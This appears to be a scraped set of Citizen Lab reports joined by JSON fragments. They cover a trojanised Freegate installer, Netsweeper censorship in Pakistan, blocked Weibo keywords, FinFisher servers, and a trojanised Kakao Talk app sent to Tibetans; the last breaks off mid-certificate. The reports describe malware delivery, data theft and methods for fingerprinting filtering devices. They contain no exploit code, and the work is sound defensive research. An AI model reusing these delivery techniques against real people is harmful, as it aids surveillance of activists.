savvy opposition members for an extended period of time.\nWe hope that this post will increase awareness of the two attacks among potential targets. In the meantime, users who have executed either the fake Freegate file or clicked on one of the Windows shortcut files should consider their computers and accounts compromised.\nAppendix: Recommendations for FreeGate and FreeGate Users\nThe Freegate website is blocked in China (its primary target market), as is the case with other similar circumvention tools. To get around blocking, tools are often distributed between individuals, or through untrusted downloads from third party sites. This is an unfortunate vector for attackers to distribute malicious installers and bundles that also contain functional versions of the program. As demonstrated by our work on the Freegate malware, as well as the Green Simurgh case, these vulnerabilities are exploited with serious consequences for high-risk users.\nWe understand the resource constraints that developers of free security and circumvention software often face. As such, we propose two simple steps that Freegate could take to help mitigate the current and similar future threats.\n\n\n1) Freegate should take steps to make their users aware of the threat.\nWe provided Freegate developers with details of the attack, copies of the malicious binary, and other details prior to publication. We would like to point them towards the example established by Green Simurgh, who promptly posted a multilingual warning to their website when a malicious repackaging of their tool was found to be targeting Syrian users. We have offered to help them translate any warning materials into Arabic.\n\n\n2) Freegate should implement by-default HTTPS on their website.\nCurrently, visitors to the Freegate website follow non-HTTPS links to an unencrypted download. We believe that this presents a clear risk for man-in-the-middle attacks. Most developers of similar anti-censorship, circumvention, and security tools have implemented this security measure. We encourage Freegate to follow suit.\n\n\nAcknowledgements\nSpecial thanks to several anonymous Syrians who brought these malware samples to our attention.\nAdditional thanks to Bill Marczak, Byron Sonne, Adam Senft, and Ron Deibert.\nFootnotes\n1 State-Sponsored Malware, “Electronic Frontier Foundation,” https://www.eff.org/issues/state-sponsored-malware.\n2 We notified Freegate on June 17, 2013.\n3 MD5 b3e1c2e40be54fbc0f7921ea8ce807e2\nSHA1 3f6436420e84ac96d9a3c93045c07cdadda8ec81\nSHA256 3712907740045871eef218fea7292c9c017e64cbb56b193b93f1a1b80afe599d\n4 MD5 8eda7dfa4ec4ac975bb12d2a3186bbeb\nSHA1 b5c49bbbf7499a30110adc94480b3edbc8d6e92b\nSHA256 829e137279f691e493c211108b62c8e15b079bd619ba19ad388450878e0585d0\n5 It failed to execute with .NET 4.0 on Windows XP.\n6 The implant is installed regardless of whether or not the victim completes the FreeGate installation process.\n7 The file fg735p.exe matches the hash of a legitimate FreeGate installer.\nMD5 b083418be502162a4e248faab363f1b9\nSHA1 030937f008bc203198e3754b1b54bb6d8d72794b\nSHA256 d6ded89b91cdcd5d9ad4f6453f38f04f11f608d8db77db09e7400cfd7bcecddf\n8MD5 2ba789458781b1dfd7f34624c8410edb\nSHA1 77fd62d8e630e74d637682b91d0952d48b7c52be\nSHA256 80b3fa8113a89040048a87c63ab9d8117368f2579368f5ea5999b145c47c4490\n9 MD5 59c6e0fa61d62a1f52b6092dc92a4aa7\nSHA1 fce82013dbb9261db8b14451122fa889dfdba2e0\nSHA256 71cb3e1007da3193c89a532b275cf539730b25bd63bcc5e912503ddd4bc9097f\n10 MD5 61a26c391aa95084521f5c0f6f70b966\nSHA1 bd901cf02778d5c76dfe7c2877d773baa5bae5a7\nSHA256 2c7600e0e660b0788faf5f5de3c10ac257000a557278eba41d3e7ec6175f22fb\n11 MD5 00cc589571fa6e078cb92b34ea2ee1cc\nSHA1 bfe30069998c5e4c43f98f17538678074d02ca3d\nSHA256 bcf32f82f0971c8984bb493f5473f0f417c203c0484c80a772ee1165a8c7675d\n12 For example, see: http://undercrypter.blogspot.de/2013/03/blog-post.html.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF\nO Pakistan, We Stand on Guard for Thee:1\nAn Analysis of Canada-based Netsweeper’s Role in Pakistan’s Censorship Regime\nSummary of Key Findings\n\n\nNetsweeper filtering products have been installed on Pakistan Telecommunication Company Limited (PTCL)’s network. PTCL is Pakistan’s largest telecommunications company and also operates the Pakistan Internet Exchange Point.\n\n\nNetsweeper technology is being implemented in Pakistan on PTCL for the purposes of political and social filtering, including websites relating to  human rights, sensitive religious topics, and independent media.\n\n\n\n\nIn addition to using Netsweeper technology to block websites, ISPs also use other less transparent methods, such as DNS tampering.2 \n\n\nIntroduction\nIn February 2012, Pakistan’s Ministry of Information Technology solicited proposals for a national level URL filtering system.3 The request, originating from the Ministry’s National ICT R&D Fund, specified that the filtering system should be capable of blocking websites at the domain and subdomain level, and allow for the filtering of specific files, file types, and IP ranges. A petition by Access, an advocacy group, called on technology companies that produce network filtering technology to publicly announce that they would not submit a bid for the project. While the petition won support among several major IT companies, five firms—China-based Huawei and ZTE, US-based Blue Coat Systems and McAfee, and Canada-based Netsweeper—declined to comment.4\nIn the past, research by the OpenNet Initiative (ONI) has uncovered evidence of the filtering of blasphemous and anti-Islamic content, and sites promoting Balochi, Sindhi, and Pashtun human rights and political autonomy in Pakistan.5 Due to blasphemous content being circulated on major sites like Facebook, Twitter, and YouTube, Pakistani authorities have on different occasions blocked the entire domains of these sites as opposed to just the offending content. While the blocking of Twitter6 and Facebook7 was rescinded after periods of filtering, YouTube8 continues to be blocked. Authorities have also shut down communications in the name of national security. For example, on Pakistan Day 2012, authorities shut down cellular communications in Balochistan for 14 hours.9 A few months later, on Pakistan Independence Day, authorities shut down cellular communications once again in Balochistan.10\nOn May 2, 2013, a number of Twitter users reported that Tumblr was blocked in some regions of Pakistan, including Balochistan and Sindh.11 Based on previous findings in several Middle Eastern countries that technology provided by Netsweeper categorizes and blocks Tumblr as pornography,12 Citizen Lab searched the computer search engine Shodan for Netsweeper installations on networks in Pakistan and discovered a Netsweeper installation on Pakistan Telecommunication Company Limited (PTCL). PTCL is Pakistan’s leading telecommunications provider, offering broadband Internet connectivity to over one million subscribers and accounting for 60 percent of broadband market share in 2012.13 It also serves as a major Internet backbone provider along with Transworld Associates (TWA).14 This formerly government-owned ISP was privatized in 2006, with the Government of Pakistan still retaining a 62 percent stake in the company.15 Etisalat International Pakistan, a subsidiary of the UAE-based Emirates Telecommunication Company Corporation, owns an additional 26 percent stake16 and effectively controls the management of the company.17\nThis report documents our finding of Netsweeper filtering technology in Pakistan, describes how Netsweeper devices censor content, and explains our most recent results from Internet censorship testing in the country. We conclude our report with specific questions directed to Netsweeper in the hope of encouraging greater transparency about its product and services, especially in human rights-concerning jurisdictions like Pakistan.\nMethodology\nAs a founding partner of the ONI, the Citizen Lab has been studying and reporting on Internet censorship and surveillance worldwide since 2003. Since that time, the ONI has tested for Internet filtering in 74 countries and found that 42 of them—including both authoritarian and democratic governments—implement some level of filtering.18 The ONI combines network measurements with contextual field research to investigate the prevalence, depth, and breadth of state-mandated Internet filtering regimes.19 Our research has uncovered the use of technologies developed by Western companies to perform Internet censorship and surveillance in a number of countries governed by regimes with poor human rights records.20 This includes products produced by companies such as Netsweeper, Blue Coat Systems, Websense, and McAfee.\nIn our earlier research, Internet filtering products were often easily identified, as block pages would explicitly show the company name or logo. (See Figure 1).\n\nFigure 1: Block page from Saudi Arabia’s STC ISP in 2009, clearly displaying McAfee SmartFilter’s logo.\nHowever, such instances have become increasingly rare.21 As Western companies have come under fire for supplying censorship tools to repressive governments, ISPs have begun to remove traces of their partners from block pages. (See Figure 2).\n\nFigure 2: This updated Saudi standard block page does not display the product used for filtering.22\nIn response, the Citizen Lab has been developing reproducible methodologies for identifying filtering technology and determining whether they are being used for censorship.23 The methodology used in this report leverages key tools and datasets, such as Shodan, a search engine that lists IP addresses of externally visible devices on the Internet. We used Shodan to scan for keywords and URL fragments that have been associated with censorship devices in the past (e.g., “8080/webadmin” for Netsweeper). Results are limited by top-level domain to return only those pertaining to the country of interest. Several tools and sources are then used for validation, including WhatWeb (signatures), Internet Census 2012 (IP history), and Team Cymru (whois data).\nWe are also assisted by in-country testers running measurement software that we have developed to document instances of Internet filtering. This software attempts to access lists of predefined URLs simultaneously in both Pakistan and a control test from the University of Toronto. Two URL lists are tested in each country: a ‘global list’ (constant for each country) and a ‘local list’ (different for each country). The global list is comprised of a wide range of internationally relevant and popular websites including sites with content that is perceived to be provocative or objectionable. The local list is specific to each country, and in this case contains content specific to the Pakistani linguistic, political, social, and cultural context. Once completed, the results of these tests are sent to servers in the University of Toronto, where they are analyzed for evidence of filtering.\nTechnical Analysis\nUsing the Shodan search engine, a Netsweeper installation was found in May 2013 on the IP address 202.125.134.154, which belongs to the PTCL autonomous system AS17557. It was identified as Netsweeper based on a URL pattern which is consistent in all Netsweeper installations: the return of a block page when visiting http(s)://IP_IN_QUESTION/webadmin/deny/index.php or a netsweeper login page when visiting the IP directly. Upon visiting this IP with the block page URL pattern, a clear block page is seen referencing restricted content in Pakistan (See Figure 3), as well as a Netsweeper login page when visiting the IP directly (See Figure 4).\n\nFigure 3: A block page is seen when visiting http://202.125.134.154/webadmin/deny/index.php. \n\nFigure 4: A Netsweeper login page is seen when visiting http://202.125.134.154/webadmin/start.\n\nThese URL patterns and results are consistent with previously observed installations of Netsweeper24 and are highly consistent with Netsweeper’s own documentation on configuring block pages.25 PTCL customers have also posted on Pakistani Internet forums in a number of different cases, each time reporting the occurrence of this block page upon trying to visit content such as file sharing and proxy sites.26 The screenshots and IP addresses reported in these cases are identical to the identified installation of Netsweeper. In June 2013, we scanned Pakistan’s network again using Shodan, and another IP address hosting Netsweeper emerged (http://119.159.224.68:8080/webadmin/start). This IP address also belongs to the PTCL autonomous system AS17557. Both IP addresses are hosted on PTCL, which also operates the Pakistan Internet Exchange (PIE). Pakistan’s PIE was created by the PTCL, managing a significant portion of Pakistan’s overall Internet traffic.27\nAs can be seen in Figure 5, AS17557 (PTCL) provides the bulk of Pakistan’s connectivity to ASes outside of the country:\n\nFigure 5: A map of the Pakistani Internet infrastructure. PTCL’s AS17557 (highlighted along with connected autonomous systems) has most of the links to ASes outside of the country.\nAdditionally, the text that is present on the block page is consistent with the messaging on other observed block pages in the region on different Pakistani ISPs (See Figure 6). The installations on these particular IPs are not consistent with the use of Netsweeper, but the language used does seems to indicate a uniform requirement for all block page text.\n \n\n \n\n \n\n \n\n \n\nFigure 6: A sample of five block pages on the other Pakistani ISPs seen on Transworld, Micronet, Skytel, Netlinx, and Wi-Tribe.\nWe also examined another public source of information about Internet-connected devices, the Internet Census 2012, for the presence of Netsweeper devices. The Internet Census 2012 data is controversial, as it used a vast network of unsecured, publicly-accessible devices without consent to collect data about Internet-connected devices.28 We have used the dataset for this research as it is in the public domain and contains an unreplicated view of connected devices; however, Citizen Lab does not condone research methods that may be unethical or illegal.29 \nWe searched the Internet Census 2012 dataset for information related to the IP addresses of the PTCL Netsweeper devices. The first IP address, 202.125.134.154, returned no data for a GET request on port 80. This may indicate that the device was not present at the time of the Internet Census 2012 data collection, which took place from June 2012 to December 2012. This absence may indicate that the IP address represents a new Netsweeper installation installed sometime between December 2012 and May 2013, but further research of the Internet Census dataset is required. \nThe IP address of the second identified Netsweeper device, 119.159.224.68, returned the following to a GET request on port 80 in the Internet Census data:\n\nHTTP/1.1 302 Found\nDate: Sat, 15 Dec 2012 16:06:58 GMT\nServer: Apache\nLocation: http://127.0.0.1/webadmin/\nContent-Length: 269\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n \n<!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML 2.0//EN”>\n<html><head>\n<title>302 Found</title>\n</head><body>\n<h1>Found</h1>\n<p>The document has moved <a href=3D”http://127.0.0.1/webadmin/”>here</a>.</p>\n<hr>\n<address>Apache Server at 127.0.0.1 Port 80</address>\n</body></html>\n\nThe response to a similar GET request in June 2013 was as follows:\n\nHTTP/1.1 302 Found\nDate: Wed, 19 Jun 2013 16:43:42 GMT\nServer: Apache\nLocation: http://119.159.224.68/webadmin/\nContent-Length: 279\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n \n<!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML 2.0//EN”>\n<html><head>\n<title>302 Found</title>\n</head><body>\n<h1>Found</h1>\n<p>The document has moved <a href=”http://119.159.224.68/webadmin/”>here</a>.</p>\n<hr>\n<address>Apache Server at 119.159.224.68 Port 80</address>\n</body></html> \n\nThe two responses are identical with the exception of the IP address that it redirects to, which changed from 127.0.0.1 (localhost) to 119.159.224.68. This similar response suggests that the same device was present in December 2012 and June 2013. We hypothesize that the December 2012 redirection to 127.0.0.1/webadmin represents a device which has yet to be properly configured. We are conducting a more detailed scan of the Internet Census dataset and will write a follow-up with our findings.\nAltogether, the evidence suggests that Netsweeper filtering devices are being actively used to censor content on an ISP-wide level in Pakistan.\nIn-Country Test Results\nIn June 2013, we conducted in-country tests on PTCL. These tests were run from a number of different locations throughout the country. Testers ran a software tool which queried a list of 1,465 URLs simultaneously on both PTCL and a control test at the University of Toronto. The results of these tests were analyzed at the University of Toronto to determine if any URLs were blocked. Lists of the URLs tested as well as blocked URLs can be found in the Data section at the end of this report.\nTest results were consistent with prior test results documented by the ONI.30 June 2013 testing found evidence of 123 URLs blocked through a variety of methods. In some cases, URLs were blocked by different methods on different tests. 90 URLs were found to be blocked by one of two explicit block pages on at least one occasion. \n39 unique URLs were found blocked with the block page seen in Figure 7.\n\nFigure 7: Block page found on PTCL during June 2013 testing\n31 URLs were found to be blocked by consistently failing to resolve or by resolving to localhost (127.0.0.1) during the DNS resolution process. Two URLs either did not see a response to the TCP handshake or were forcibly closed through RST packets.\nNetsweeper-enabled Blocking\nIn addition to the above-mentioned methods of blocking, 51 URLs received the block page seen in Figure 8 on at least one test:\n\nFigure 8: Block page found on PTCL during June 2013 testing.\nThe HTML source code of the block page shown in Figure 8 above is as follows:31\n\n<iframe src=”http://202.125.134.154/webadmin/deny/?dpid=1&dpruleid=78&cat=104&ttl=0&groupname=PTCL2&policyname=PTCL2-policy&username=MMBB-9-WLL&userip=X.X.X.X&connectionip=127.0.0.1&nsphostname=X&protocol=policyprocessor&dplanguage=-&url=X”width=”100%”height=”100%” frameborder=0></iframe>\n\nThe format of this block page is highly consistent with Netsweeper’s documentation for configuring block pages.32\nURLs from a variety of content categories were found blocked using this method. 15 YouTube videos and four websites dealing with the Muhammad cartoon controversy were blocked, as were a number of websites containing content critical of Islam. Several websites relating to Baloch issues, including news sites http://balochwarna.com and http://thebalochhal.com, were also found blocked. Also found blocked were proxy and circumvention tools, bittorrent file-sharing sites, and pornography.\nThese results show that URLs are blocked on PTCL through a variety of methods, and with varying degrees of transparency. Some URLs were accessible on some tests while blocked on others. While all testing took place on PTCL, the tests were run from several different regions of the country, which could potentially explain some inconsistency in results. However it is clear from these results, particularly given the block page seen in Figure 8, that Netsweeper technology is being used to filter web content on PTCL.\nOther ad hoc tests have documented other types of content blocked via Netsweeper. For example, the website Answering Islam, which is critical of the Islamic faith, was found to be blocked with this same block page, as was the website of British evolutionary biologist Richard Dawkins, likely because of objections to the theory of evolution and Darwinism among Pakistani authorities.\nHow Netsweeper’s Content Filtering Solution Works\nNetsweeper Inc. is a Canada-based provider of web content filtering and web threat management products.33 Its filtering service has been used for the purposes of state-sanctioned censorship in several countries. For example, national ISPs in Qatar, United Arab Emirates, Kuwait, and Yemen employ Netsweeper to implement political and religious censorship.34 As we cited in a previous report, Netsweeper has stated that its product can be used to block inappropriate content to meet government rules and regulations “based on social, religious, or political ideals.”35\nThe deployment of Netsweeper at the ISP level can potentially result in pervasive filtering across various categories as a result of the way Netsweeper technology works. Its web filtering solution provides clients with an automated mechanism to bulk-filter entire content categories. Netsweeper’s content categories include:36\n\n\nAdult (adult image, alcohol, alternative, criminal skills, extreme, gambling, hate speech, lifestyles, matchmaking, occult, pornography, profanity, substance abuse, weapons)\n\n\nEntertainment (arts and culture, educational games, entertainment, games, humour, sports)\n\n\nInformation (general news, journals and blogs, political, portals, religion, self help, sex education, social networking, technology, travel)\n\n\nSecurity (adware, directory, host is an IP, intranet servers, malformed URL, phishing, anonymizer, viruses and malware)\n\n\nMiscellaneous (investing, job search, sales, search engine, web chat, web e-mail)\n\n\nAdvanced (general, images, network timeout, network unavailable, new URL, no text redirector page, safe search, search keywords).\n\n\nCustom Categories (e.g. extreme sites for racism)\n\n\nISPs and telecom operators can choose which of these categories they want to block but can also manually add their own categories and URLs. Websites are categorized at a rate of approximately 10 million new URLs every day.37 Netsweeper uses an artificial intelligence engine to categorize new and uncategorized URLs in real time.\nWhen a user attempts to access a website, the “Netsweeper Enterprise Filter” intercepts the request and sends it to the “Policy Server” to determine whether access to the site should be allowed or denied. If the website is in this local database, the Policy Server categorizes the website and gives direction to the Netsweeper Enterprise Filter based on the client’s specific filtering policy. If the client’s filtering policy does not allow the content category that the website request belongs to, the request is denied and the Enterprise Filter returns a block page to the user.\nIf the Policy Server is unable to categorize the website, it sends the URL to the Category Name Server (CNS) for categorization. If unsuccessful, it continues upstream, requesting categorization from the Master Category Name Server, and finally, for categorization by the Categorization Engine. In real time, the Categorization Engine uses artificial intelligence to scan the words and images, assigns the website a content category and updates the Categorization Database with the URL and its category. The Policy Server then carries out the request based on the categorization and the client’s filtering policy. Netsweeper states that the process of categorization—from user request to categorization engine categorization—only takes a maximum of five seconds. (See Figure 9: Netsweeper Filtering Process).38  Netsweeper has categorized over 5 billion URLs in total.39\n\nFigure 9: Netsweeper Filtering Process. Source: “Netsweeper Internet Content Filtering.”40 \nThe comprehensiveness of the content categories shows how pervasive censorship can be both in scope and depth. It also shows how a commercial company can aid national censors not only by providing technology but also by defining the parameters of permissible content through categorization. Yet, Netsweeper’s artificial intelligence categorization engine has proven to be unreliable.41 As previously mentioned, research by the OpenNet Initiative has shown how Tumblr.com and all blogs hosted by Tumblr were blocked in Qatar, UAE, Yemen, and Kuwait due to Netsweeper’s miscategorization of the site as “pornography.”42\nConclusion\nAdvocacy groups have expressed concern around the lack of accountability and transparency surrounding Pakistan’s censorship and surveillance practices. Pakistan’s 1996 Telecommunications Act has been criticized by rights groups for containing too many broad provisions that justify restrictions on expression and privacy in order to protect undefined national security interests.43 In the past, the OpenNet Initiative has found that Pakistani authorities block content that they consider blasphemous, anti-Islamic, or threatening to internal security—particularly content that promotes Balochi, Sindhi, and Pashtun human rights and political autonomy.44 In addition, the Pakistani advocacy group Bytes for All has expressed concern over the country’s lack of privacy laws and data protection legislation in light of the Citizen Lab’s discovery of a FinFisher command and control server in Pakistan.45 FinFisher is a surveillance technology sold by the UK-based Gamma Group that has been used to surveil journalists, dissidents, and activists in a number of countries.46 The fact that Pakistan has deployed the Netsweeper filtering technology at the national Internet Exchange level is a significant development given the potential of extending Internet censorship to lower-level ISPs in the country. Our report sheds light on the commercial technology used by Pakistani authorities to conduct national-level content filtering, but many ethical and legal questions remain.\nPakistan is not the only country in which Netsweeper has been used for filtering purposes. Prior Citizen Lab research has identified Netsweeper operating on ISPs in several other countries with questionable human rights records, including Qatar, UAE, Yemen, and Kuwait.47 Netsweeper’s presence in these countries indicates that the company is aggressively moving into the mass political censorship market at the very time that human rights concerns are being raised both about these practices and the companies that serve them. At one time, the company even published on its website a brochure that advertised that its product provides blocking of “inappropriate content using pre-established list of 90+ categories to meet government rules and regulations—based on social, religious, or political ideals.”48 At of the time of writing, that brochure is no longer available on the website, possibly indicating the company is becoming less transparent about the services it offers in this particular market.\nCompanies that provide equipment and services that can be used or otherwise modified to infringe on human rights are increasingly being pressed to provide greater transparency around the decisions they take and the services they provide in specific jurisdictions. To further that end, and consistent with prior Citizen Lab research reports on the issue-area involving other companies,49 we pose the following questions to Netsweeper:\n\n\nDoes Netsweeper have a human rights policy, and does it implement this policy when developing its technologies and sales strategy?\n\n\n\n\nDoes the company assess the human rights impact of its products during the design phase and has it ever discarded or altered designs given their inherent capability to undermine rights of freedom of expression and access to information?\n\n\n\n\nWhat resources does Netsweeper devote to human rights program at the operational level? Does Netsweeper ask staff in relevant departments (e.g., legal, sales, engineering) to undergo human rights training?\n\n\n\n\nIs Netsweeper aware of the “know your customer” standard, where companies actively investigate whether potential clients may use technology to undermine human rights standards?50 If so, how does it implement this standard (for example, through active investigation of a government’s human rights record)?\n\n\n\n\nHas Netsweeper implemented the United Nations Guiding Principles on Business and Human Rights (the so-called “Ruggie Principles”) in building a business strategy that safeguards human rights standards?51\n\n\n\n\nHas Netsweeper explored joining the Global Network Initiative (GNI), a network of business, civil society, and academic stakeholders, in finding solutions for technology companies to uphold standards of privacy and free expression, as the ICT company Websense did in 2011?\n\n\nWe commit to publishing in full Netsweeper’s reply.\nData\nThe complete list of URLs found blocked, as well as the list of URLs tested, can be found in the following:\nComplete list of URLs found blocked on PTCL:\n\n\n[CSV][Google Drive]\n\n\nTesting conducted from June 2nd to 13th, 2013\n\n\nList of URLs tested on PTCL:\n\n\n[CSV][Google Drive]\n\n\nTesting conducted from June 2nd to 13th, 2013\n\n\nAcknowledgements\nCitizen Lab would like to thank Bytes for All (B4A) in Pakistan for their assistance in gathering technical data and assisting in the research for this report.\nMedia Coverage\nMedia coverage of the report includes the Toronto Star, The Globe and Mail, Financial Post, as well as CIO, and PC World.\nFootnotes\n1 The title is a reference to the Canadian national anthem (“O Canada, We Stand on Guard for Thee”).\n2 DNS tampering is the practice of preventing nameservers from returning the correct IP address to a DNS resolution request.\n3 “Government May Set Up National Internet Blocking System,” The Express Tribune, February 25, 2012, http://tribune.com.pk/story/341663/government-may-set-up-national-internet-blocking-system.\n4 “20 Million Silenced?,” Access, https://www.accessnow.org/page/s/20-million-silenced.\n5 See: “Internet Filtering in Pakistan in 2006-2007,” OpenNet Initiative, https://opennet.net/studies/pakistan2007;

    "text": "\n\t\t\t\tAs citizens in China and around the world commemorate the twenty-fourth anniversary of the June 4th incident in Beijing’s Tiananmen Square, Internet censorship in China around this sensitive date has now become expected and almost routine. Though, as Tech in Asia notes, the censorship this year likely won’t be as intense as it was during the twentieth anniversary—when hundreds of sites went down for so-called “Internet maintenance”—and as websites consider more subtle forms of filtering out June 4-related posts, much overt censorship will still take place on sites behind the Great Firewall, including seemingly trivial steps like removing the candle emoticon from being inserted into Sina Weibo posts.\nAnother way the social media site Sina Weibo censors its site—alongside manual deletions by human censors of sensitive content and other steps—is by blocking the user from searching for specific keywords, and instead returning a message that says no results can be displayed. Though the blocking of keywords is a blunt tactic that often cuts off access to many legitimate posts—in addition to sometimes being ineffective as users switch to homophones or other code words—it is still widely employed on the site. Below are seventy-one keywords (along with brief translations and notes by researchers here at Citizen Lab) that are currently blocked from searching on Sina Weibo.\n\n\n\nWords related to June 4 that are blocked from searching on Sina Weibo as of 2013-06-03 16:00:00 UTC\n\n\nkeyword\nnotes/translation\ntriggered by\n\n\nJUNE4事件\nJune 4 incident\nJUNE4\n\n\n天安门\nTiananmen Square \n \n\n\n坦克人\nTank man\n坦克\n\n\nliu四\nJun-04\n \n\n\n六四\nIn reference to the Tiananmen Square protests that occurred on June 4th, 1989.

    "text": "\n\t\t\t\tby: Morgan Marquis-Boire,  Bill Marczak, Claudio Guarnieri & John Scott-Railton\nCitizen Lab is pleased to announce the release of “For Their Eyes Only: The Commercialization of Digital Spying.”\nRead the Report [PDF]*\n(updated on 16 September 2013)\nThe report features new findings, as well as consolidating a year of our research on the commercial market for offensive computer network intrusion capabilities developed by Western companies.\nOur new findings include:\n\nWe have identified FinFisher Command & Control servers in 11 new Countries. Hungary, Turkey, Romania, Panama, Lithuania, Macedonia, South Africa, Pakistan, Nigeria, Bulgaria, Austria.\n\n\nTaken together with our previous research, we can now assert that FinFisher Command & Control servers are currently active, or have been present, in 36 countries.\n\n\nLocations of FinFisher Command & Control Servers Found To Date:  Australia, Austria, Bahrain, Bangladesh, Brunei, Bulgaria, Canada, Czech Republic, Estonia, Ethiopia, Germany, Hungary, India, Indonesia, Japan, Latvia, Lithuania, Macedonia, Malaysia, Mexico, Mongolia, Netherlands, Nigeria, Pakistan, Panama, Qatar, Romania, Serbia, Singapore, South Africa, Turkey, Turkmenistan, United Arab Emirates, United Kingdom, United States, Vietnam.\n\nWe have also identified a FinSpy sample that appears to be specifically targeting Malay language speakers, masquerading as a document discussing Malaysia’s upcoming 2013 General Elections. Click here for a plain-language summary of our findings from Malaysia, as well as background on FinFisher.\n\n\nWe identify instances where FinSpy makes use of Mozilla’s Trademark and Code. The latest Malay-language sample masquerades as Mozilla Firefox in both file properties and in manifest. This behavior is similar to samples discussed in some of our previous reports, including a demo copy of the product, and samples targeting Bahraini activists.\n\n\nFinFisher’s Global Proliferation: Updated Map (Click to enlarge)\nOur previous research uncovered evidence that FinFisher (commercial network intrusion malware) developed by UK-based company Gamma International was targeting activists in Bahrain. It analyzed mobile variants of the FinFisher suite.  It also exposed the use of commercial surveillance malware developed by Italy-based company Hacking Team to target a dissident in the United Arab Emirates.  Most recently, we documented the global proliferation of FinFisher command and control servers.\nThis research is one of the first extended projects to attempt to map out the operation and prevalence of commercial surveillance software.  Our work opens a window into this space, but it remains crucial that the nature and impact of the commercial surveillance market be better understood. Technical research in this field has only just begun, but it is already clear that the stakes are high.

    "text": "\n\t\t\t\tDownload PDF\nThis post has been updated (18 April 2013).\nKey Findings\n\nA compromised version of Kakao Talk, an Android-based mobile messaging client, was sent in a highly-targeted email to a prominent individual in the Tibetan community.\nThis email message repurposed a legitimate private email message sent by an information security expert in the Tibetan community to a member of the Tibetan parliament-in-exile.\nThis malware is designed to send a user’s contacts, SMS message history, and cellular network location to attackers.\nThe cellular network information gathered by this malware would only be useful to actors with detailed knowledge of the cellular communication provider’s technical infrastructure.\nThe compromised application was not detected as malware by any of the three mobile malware scanning applications we tested.\n\nBackground\nThis blog post is part of a series documenting the use of information operations against Tibetans and others who advocate for Tibetan rights and freedoms. This research is part of the Citizen Lab’s ongoing study of targeted cyber threats against human rights organizations. Prior research by the Citizen Lab has documented targeted malware sent to a Tibetan organization by the APT1 group, malware that repurposes privately-held content of Tibetan groups, and malware that leverages the issues of self-immolations amongst Tibetans and a European Parliament resolution on the human rights situation in Tibet.\nThe incident described in this post stands out from our past reports given its use of malware designed for the Android platform. The attack repurposed a genuine private email message containing a legitimate Android Application Package File (APK) that was sent from an information security expert in the Tibetan community to a member of the Tibetan parliament-in-exile. It is likely that the attacker obtained the original message and attachment through a compromised email account of the parliament member. The attacker then sent the same message to another prominent member of the Tibetan community, but this time with a compromised version of the same Android APK containing malicious code.\nMalware targeting the Tibetan community has utilized a variety of platforms over time. The majority of targeted malware campaigns against the Tibetan community focus on Windows platforms. However, we have also seen attacks targeting Macs and the emergence of mobile malware. Additionally, during investigations of command and control (C2) servers associated with the Luckycat campaign [PDF], Trend Micro [PDF] found two malicious Android APKs in early stages of development that could collect device information and download and upload files by remote command. Based on the available information, it was not clear to Trend Micro how the attackers intended to deliver the mobile malware to targets.\nOn March 26, 2013, researchers at Kaspersky reported on a compromise of an email account of a high-profile Tibetan activist, which was used by attackers to send targeted malware to the activist’s contact list. The targeted attacks leveraged email content about the World Uyghur Congress and included a malicious APK file purporting to be an app with information on the event. That malware allowed attackers to collect data from infected devices including contacts, call logs, SMS messages, geo-location, and phone data (phone number, OS version, phone model, SDK version).\nAttack Overview\nIn January 2013, a Tibetan source provided the Citizen Lab with a forged email containing a compromised software installation package, in the form of an Android APK, for a mobile application called Kakao Talk. Kakao Talk is an application developed by a South Korean company that “allows its users to send and receive messages including photos, videos and contact information, both on a one-to-one basis and in groups, all for free.” Members of the Tibetan community have used Kakao Talk and other applications as alternatives to WeChat (a chat client rapidly rising in popularity) after concerns were raised regarding that application’s general security and the potential for Tencent (the Chinese company that provides the application) to monitor users at the behest of the Chinese government.\nOn December 4, 2012, an information security expert who works within the Tibetan community sent a private email to a member of the Tibetan parliament-in-exile, based in Dharamsala, India. That email attached a genuine version of Kakao Talk and Tunein (an online radio application) as .apk files.\nOn January 16, 2013, an email purporting to be from this same information security expert was sent to a high profile political figure in the Tibetan community. The email contained the same text as the message from December 4, but attached a compromised version of the same Kakao Talk Android APK, as seen below in Figure 1.\n\nFigure 1: Forged email containing compromised version of Kakao Talk APK (highlighted in red). The email spoofed the real address of the security expert who originally sent the legitimate message. The actual sender email address used by the attackers was uygur52@gmx.com.\nTechnical Analysis\nOur analysis reveals that the legitimate Kakao Talk application was modified to include additional permission requests while preserving the core chat functionality and user interface of the application. (Hereafter this added functionality will be referred to as the “malware.”) In order for the malware to be installed, the user must permit applications to be installed from sources other than the Google Play store. This permission is not enabled by default in Android. However, as many members of the Tibetan community (particularly those inside Tibetan areas) have access to the Google Play service restricted, they are required to permit applications to be installed from outside sources, and circulating APKs outside of Google Play is common. In addition to permitting the “allow from unknown sources” option, the user must also must permit the additional permissions requested by the application. Users may be duped into accepting these permissions by assuming they are required for the regular functionality of the application or by not reviewing them carefully and approving. Once these permissions are approved, they are used to authorize the additional data-gathering capabilities of the malware, which is configured to autostart on device boot.\nThe Kakao Talk application and malware were repackaged into the modified APK and signed with an illegitimate certificate. Both the original and illegitimate certificates are reproduced below. Notice that fields in the illegitimate certificate have been populated with what appears to be an assortment of nonsensical characters from a QWERTY keyboard:\nOriginal legitimate certificate:\nOwner: OU=kakaoteam, O=kakao, C=ko\nIssuer: OU=kakaoteam, O=kakao, C=ko\nSerial number: 4c707197\nValid from: Sat Aug 21 20:38:47 EDT 2010 until: Mon Jul 28 20:38:47 EDT 2110\nCertificate fingerprints:\nMD5: 70:D4:94:75:18:38:25:BE:88:A1:BA:9A:50:30:DA:E3\nSHA1: EC:C4:5B:90:2A:C1:E8:3C:8B:E1:75:8A:25:7E:67:49:2D:E3:74:56\nSignature algorithm name: SHA1withRSA\nVersion: 3\nIllegitimate certificate:\nOwner: CN=qwe, OU=asd, O=zxc, L=rty, ST=fgh, C=vbn\nIssuer: CN=qwe, OU=asd, O=zxc, L=rty, ST=fgh, C=vbn\nSerial number: a3e5475\nValid from: Tue Jan 08 22:45:49 EST 2013 until: Wed Oct 12 23:45:49 EDT 2067\nCertificate fingerprints:\nMD5: BC:04:8C:12:93:39:BE:B7:72:B3:62:E0:9C:B3:03:0B\nSHA1: A6:41:78:7B:93:FC:00:77:ED:61:AC:B9:10:9B:07:48:46:9A:76:EB\nSignature algorithm name: 